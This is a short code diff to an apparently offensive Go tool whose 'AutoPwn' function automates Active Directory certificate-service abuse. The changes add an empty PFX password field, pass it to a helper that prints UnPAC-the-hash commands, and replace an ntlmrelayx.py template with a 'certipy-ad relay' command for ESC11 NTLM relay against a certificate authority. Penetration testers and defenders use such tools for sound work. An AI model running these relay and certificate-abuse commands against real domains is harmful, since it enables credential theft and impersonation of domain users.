@@ -112,6 +112,7 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			CertPath:  filepath.Join(cfg.OutputDir, upnUser+".crt"),
 			KeyPath:   filepath.Join(cfg.OutputDir, upnUser+".key"),
 			PFXPath:   filepath.Join(cfg.OutputDir, upnUser+".pfx"),
+			PFXPass:   "",
 			DC:        cfg.TargetDC,
 			Domain:    cfg.Domain,
 			TargetUPN: cfg.TargetUPN,
@@ -168,12 +169,13 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			CertPath:  result.CertPath,
 			KeyPath:   result.KeyPath,
 			PFXPath:   result.PFXPath,
+			PFXPass:   "",
 			DC:        cfg.TargetDC,
 			Domain:    cfg.Domain,
 			TargetUPN: cfg.TargetUPN,
 		})
 		if result.PFXPath != "" {
-			PrintUnPACCommands(result.PFXPath, cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
+			PrintUnPACCommands(result.PFXPath, "", cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
 		}
 
 		return result, nil
@@ -258,7 +260,7 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 	// ESC11: NTLM relay to RPC interface (manual)
 	for _, f := range result.ESC11Findings {
 		relayCmd := fmt.Sprintf(
-			"ntlmrelayx.py -t rpc://%s -rpc-mode ICPR -icpr-ca-name %q -smb2support",
+			"certipy-ad relay -target rpc://%s -ca %q",
 			f.CAHostname, f.CAName,
 		)
 		candidates = append(candidates, escCandidate{
